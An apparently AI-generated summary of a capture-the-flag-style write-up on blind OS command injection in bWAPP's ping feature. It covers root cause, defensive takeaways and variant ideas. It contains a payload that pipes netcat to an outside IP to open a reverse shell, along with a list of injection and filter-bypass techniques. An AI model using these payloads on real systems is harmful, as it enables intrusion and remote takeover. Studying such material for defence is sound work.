# OS Command Injection on bWAPP - Blind Command Execution

## Metadata
- **Source:** writeups.io
- **Date:** 2026-06-15
- **Author:** Various
- **Program:** bWAPP (Buggy Web Application)
- **Bounty:** N/A - Educational/Vulnerable Application
- **Severity:** critical
- **Vuln types:** OS Command Injection, Improper Input Validation, Lack of Output Sanitization
- **Category:** web-api
- **Writeup:** https://medium.com/@crk2500/os-command-injection-on-bwapp-edbcf6f27224

## Summary
A blind OS command injection vulnerability exists in the bWAPP ping functionality that allows unauthenticated attackers to execute arbitrary system commands through unsanitized user input. The application fails to properly validate or escape the IP address parameter, enabling an attacker to inject shell metacharacters (pipe operators) to execute unauthorized commands on the underlying system.

## Attack scenario (step by step)
1. Attacker identifies the bWAPP ping utility that accepts user-supplied IP addresses
2. Attacker crafts a malicious payload using shell metacharacters, e.g., '127.0.0.1|nc 192.168.48.133 4757'
3. The pipe operator (|) chains the ping command with netcat, bypassing the intended ping-only functionality
4. The vulnerable application concatenates the unsanitized input directly into a system command without escaping
5. The system executes both the ping command and the injected netcat command with application privileges
6. Attacker establishes a reverse shell connection, gaining arbitrary code execution on the server

## Root cause
The application accepts user input for an IP address parameter and directly concatenates it into a system command (likely via exec() or system() function) without proper input validation, sanitization, or use of safe APIs like parameterized execution. No allowlist validation is performed to ensure the input contains only valid IP address characters.

## Attacker mindset
Attacker recognized that ping functionality typically invokes OS-level commands and tested for command injection by injecting pipe operators to chain additional commands. The blind nature of the vulnerability was overcome by establishing an out-of-band connection (netcat) to confirm successful execution, demonstrating persistence and methodology in exploitation.

## Defensive takeaways
- Implement strict input validation using allowlists - only permit characters valid in IP addresses (digits and dots)
- Use parameterized/safe APIs instead of string concatenation (e.g., use libraries that safely invoke ping rather than shell commands)
- Apply principle of least privilege - run web application with minimal required permissions, not as root
- Disable dangerous functions like exec(), system(), passthru() or use disabled_functions in php.ini if possible
- Implement output encoding and error handling to prevent information disclosure
- Use Web Application Firewalls (WAF) to detect and block command injection payloads
- Conduct security code review focusing on all user input handling paths

## Variant hunting
['Test other network utilities (traceroute, dig, nslookup, ifconfig) for similar injection vulnerabilities', 'Attempt blind command injection variants: semicolon (;), ampersand (&), backticks (`), command substitution $(), logical operators (&&, ||)', 'Test for time-based blind injection to confirm execution without out-of-band channels', 'Inject DNS exfiltration payloads to extract data through DNS queries', 'Test filepath traversal combined with command injection to read sensitive files', 'Attempt bypass techniques: encoding (URL, base64, hex), variable expansion, wildcard abuse']

## MITRE ATT&CK
- T1190
- T1059
- T1086
- T1203

## Notes
This vulnerability demonstrates a critical flaw in educational/vulnerable applications designed for security training. The 'blind' aspect refers to lack of command output feedback to the attacker, not difficulty of exploitation. Real-world applications with similar patterns often exist in legacy systems, IoT devices, and poorly secured network utilities. The writeup effectively demonstrates practical exploitation methodology including out-of-band exfiltration techniques.

---
*Analysed by Claude (claude-haiku-4-5-20251001) on 2026-06-15*
